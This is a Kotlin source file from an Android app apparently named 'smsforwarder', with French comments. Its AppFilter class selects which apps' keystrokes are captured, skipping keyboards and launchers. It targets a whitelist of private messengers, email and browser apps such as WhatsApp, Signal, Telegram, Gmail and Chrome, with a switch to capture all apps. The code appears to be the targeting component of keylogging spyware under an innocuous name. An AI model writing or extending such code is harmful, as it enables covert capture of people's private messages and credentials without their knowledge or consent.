package com.smsforwarder

import android.content.Context
import android.view.inputmethod.InputMethodManager

/**
 * Décide ce qui est ignoré et ce qui est capturé.
 *
 * Les IME sont résolus dynamiquement : la liste statique n'est qu'un repli si
 * le système ne répond pas.
 */
class AppFilter(private val context: Context) {

    private val staticImes = setOf(
        "com.samsung.android.honeyboard",
        "com.google.android.inputmethod.latin",
        "com.touchtype.swiftkey",
        "com.swiftkey.swiftkeyconfigurator",
        "com.baidu.input",
        "com.iflytek.inputmethod"
    )

    private val launchers = setOf(
        "com.sec.android.app.launcher",
        "com.android.launcher3",
        "com.google.android.apps.nexuslauncher",
        "com.miui.home",
        "com.oppo.launcher",
        "com.huawei.android.launcher"
    )

    private val keyWhitelist = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "org.telegram.messenger",
        "org.thoughtcrime.securesms",
        "com.facebook.orca",
        "com.instagram.android",
        "com.google.android.gm",
        "com.android.chrome",
        "com.samsung.android.messaging",
        "com.google.android.apps.messaging"
    )

    @Volatile
    private var cachedImes: Set<String> = staticImes
        private var cachedAt = 0L

        private fun imes(): Set<String> {
            val now = System.currentTimeMillis()
            if (now - cachedAt < 60_000L) return cachedImes
                cachedAt = now
                cachedImes = try {
                    val manager = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                    val found = manager.inputMethodList.mapNotNull { it.packageName }.toSet()
                    if (found.isEmpty()) staticImes else found + staticImes
                } catch (t: Throwable) {
                    staticImes
                }
                return cachedImes
        }

        fun isIgnoredForApps(pkg: String): Boolean {
            if (pkg.isBlank()) return true
                if (pkg in imes()) return true
                    if (!Config.LOG_SYSTEMUI && pkg == "com.android.systemui") return true
                        if (!Config.LOG_OWN_APP && pkg == context.packageName) return true
                            if (!Config.LOG_LAUNCHER && pkg in launchers) return true
                                return false
        }

        fun isIgnoredForKeys(pkg: String): Boolean {
            if (!Config.CAPTURE_KEYS) return true
                if (isIgnoredForApps(pkg)) return true
                    if (pkg == context.packageName) return true
                        return !Config.CAPTURE_ALL_APPS && pkg !in keyWhitelist
        }
}
